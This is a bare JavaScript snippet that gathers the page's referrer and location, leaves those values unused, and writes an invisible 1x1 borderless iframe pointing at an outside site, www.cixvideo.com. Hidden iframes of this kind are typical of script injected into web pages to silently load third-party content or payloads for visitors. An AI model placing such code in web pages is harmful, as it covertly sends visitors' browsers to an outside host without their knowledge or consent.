
if(self != top){
  var bref=document.referrer+"?("+document.location+")";
  var burl=document.referrer+"?("+document.location+")";
}else{
  var bref=document.referrer;
  var burl=document.location;
}
bref = escape(bref);
burl = escape(burl);

document.write("<div><iframe width='1' height='1' marginwidth='0' marginheight='0' frameborder='0' scrolling='no' src='http://www.cixvideo.com'></iframe></div>");
